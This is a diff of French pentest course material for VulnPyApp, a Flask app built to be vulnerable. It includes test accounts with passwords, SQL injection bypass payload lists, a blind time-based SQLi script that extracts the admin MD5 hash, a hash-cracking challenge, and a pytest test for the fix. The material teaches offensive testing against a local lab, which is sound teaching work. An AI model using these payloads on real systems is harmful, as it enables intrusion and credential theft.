@@ -133,9 +133,10 @@ Pour cette formation, nous utiliserons une application Flask volontairement vuln
 
 **Application Python vulnérable - VulnPyApp**
 
+Le code source de l'application est fourni dans le dossier `vulnpyapp/` du dépôt de la formation (lien fourni par l'enseignant).
+
 ```bash
-# Cloner le repo de formation
-git clone https://github.com/formation-secdesign/vulnpyapp
+# Se placer dans le dossier de l'application
 cd vulnpyapp
 
 # Environnement virtuel
@@ -143,8 +144,11 @@ python3 -m venv venv
 source venv/bin/activate  # Linux/Mac
 # venv\Scripts\activate   # Windows
 
-# Installation
+# Installation des dépendances
 pip install -r requirements.txt
+
+# Initialisation de la base de données (utilisateurs, produits, commandes de test)
+python init_db.py
 
 # Lancement
 python app.py
@@ -155,13 +159,28 @@ python app.py
 
 ```
 vulnpyapp/
-├── app.py              # Application Flask principale
-├── models.py           # Modèles SQLAlchemy
-├── database.db         # SQLite vulnérable
-├── templates/          # Templates Jinja2
-├── static/             # Assets statiques
-└── requirements.txt
+├── app.py              # Application Flask principale (routes vulnérables)
+├── models.py           # Modèles SQLAlchemy (User, Product, Order, Comment)
+├── config.py           # Configuration (cookies non sécurisés, MD5...)
+├── init_db.py          # Initialisation BDD + comptes de test
+├── vulnpyapp.db        # SQLite (généré par init_db.py)
+├── templates/          # Templates Jinja2 (search, profile, comments...)
+├── static/             # Assets statiques (style.css)
+├── uploads/            # Dossier pour /download (path traversal)
+├── solutions/          # Scripts d'exploit (enseignant uniquement)
+├── tests/              # Tests pytest
+├── requirements.txt
+├── Dockerfile          # Conteneur prêt-à-l'emploi
+└── docker-compose.yml
 ```
+
+**Comptes de test (fournis par `init_db.py`)** :
+
+| Email | Mot de passe | Rôle |
+|-------|--------------|------|
+| `admin@vulnpyapp.local` | `Admin123!` | admin |
+| `alice@vulnpyapp.local` | `Alice123!` | utilisateur |
+| `bob@vulnpyapp.local` | `Bob123!` | utilisateur |
 
 ### 1.3.2 Outils nécessaires
 
@@ -259,9 +278,9 @@ def login(email, password):
     return cursor.fetchone()
 ```
 
-**Avec l'input malveillant** `email = "admin@app.com' --"` :
+**Avec l'input malveillant** `email = "admin@vulnpyapp.local' --"` :
 ```sql
-SELECT * FROM users WHERE email = 'admin@app.com' --' AND password = 'anything'
+SELECT * FROM users WHERE email = 'admin@vulnpyapp.local' --' AND password_hash = '...'
 -- Le -- transforme la suite en commentaire SQL
 ```
 
@@ -290,8 +309,8 @@ url = "http://localhost:5000/login"
 
 # Payloads classiques de bypass
 payloads = [
-    "admin@app.com' --",
-    "admin@app.com' OR '1'='1",
+    "admin@vulnpyapp.local' --",
+    "admin@vulnpyapp.local' OR '1'='1",
     "' OR 1=1 --",
     "admin' /*",
     "' OR 'x'='x",
@@ -340,7 +359,9 @@ credentials = re.findall(r'<td>([\w@.]+:\w+)</td>', r.text)
 print(f"🔓 Credentials extraits : {credentials}")
 ```
 
-**Exemple 3 : Blind SQLi time-based**
+**Exemple 3 : Blind SQLi time-based via /search**
+
+VulnPyApp expose `/search?q=...` qui concatène l'entrée dans `SELECT * FROM products WHERE name LIKE '%...%'`. On peut détourner cette injection pour extraire des données d'autres tables via une logique conditionnelle (les requêtes coûteuses ralentissent volontairement la réponse).
 
 ```python
 # scripts/sqli_blind.py
@@ -348,31 +369,35 @@ import requests
 import time
 import string
 
-url = "http://localhost:5000/api/user"
+url = "http://localhost:5000/search"
 
 def extract_char_at_position(position):
-    """Extrait un caractère du mot de passe admin à une position donnée"""
-    for char in string.ascii_lowercase + string.digits:
+    """Extrait un caractère du hash MD5 admin à une position donnée"""
+    for char in string.hexdigits.lower():
+        # SUBSTR(password_hash, position, 1) = char
+        # Si vrai → randomblob(100000000) force un calcul long
+        # Si faux → réponse immédiate
         payload = (
-            f"1 AND (SELECT CASE WHEN "
-            f"(SUBSTR(password,{position},1)='{char}') "
-            f"THEN sqlite_version() ELSE 0 END FROM users WHERE id=1)"
+            f"x%' AND (SELECT CASE WHEN "
+            f"(SUBSTR((SELECT password_hash FROM users WHERE email='admin@vulnpyapp.local'),"
+            f"{position},1)='{char}') "
+            f"THEN randomblob(100000000) ELSE 0 END)--"
         )
         start = time.time()
-        requests.get(url, params={'id': payload})
+        requests.get(url, params={'q': payload})
         elapsed = time.time() - start
 
         if elapsed > 2:  # Si délai significatif → caractère trouvé
             return char
     return None
 
-password = ""
-for pos in range(1, 20):
+password_hash = ""
+for pos in range(1, 33):  # MD5 = 32 caractères
     char = extract_char_at_position(pos)
     if not char:
         break
-    password += char
-    print(f"Position {pos}: {char} → mdp partiel = {password}")
+    password_hash += char
+    print(f"Position {pos}: {char} → hash partiel = {password_hash}")
 ```
 
 ### 1.4.4 Automatisation avec SQLMap
@@ -888,7 +913,8 @@ Mise en situation : vous êtes engagé(e) comme pentester pour auditer VulnPyApp
   - Extrait tous les emails et hashes de mots de passe
 
 **Challenge SQLi-3 : Blind SQLi time-based**
-- Écrire un script `exploit_blind_sqli.py` qui extrait, caractère par caractère, le secret stocké dans la table `app_config` sans accès direct à la BDD
+- Écrire un script `exploit_blind_sqli.py` qui extrait, caractère par caractère, le hash MD5 du mot de passe de l'utilisateur `admin@vulnpyapp.local` depuis la table `users` via l'endpoint `/search`, sans accès direct à la BDD
+- Bonus : casser le hash MD5 obtenu avec un dictionnaire (ex. `hashcat`, `john`)
 
 **Volet XSS (3 challenges)** :
 
@@ -932,7 +958,7 @@ class TestSQLInjectionFix:
     def test_login_resists_sql_injection(self, client):
         """L'authentification résiste à l'injection SQL"""
         payloads = [
-            "admin@app.com' OR '1'='1",
+            "admin@vulnpyapp.local' OR '1'='1",
             "admin' --",
             "' OR 1=1 --",
         ]
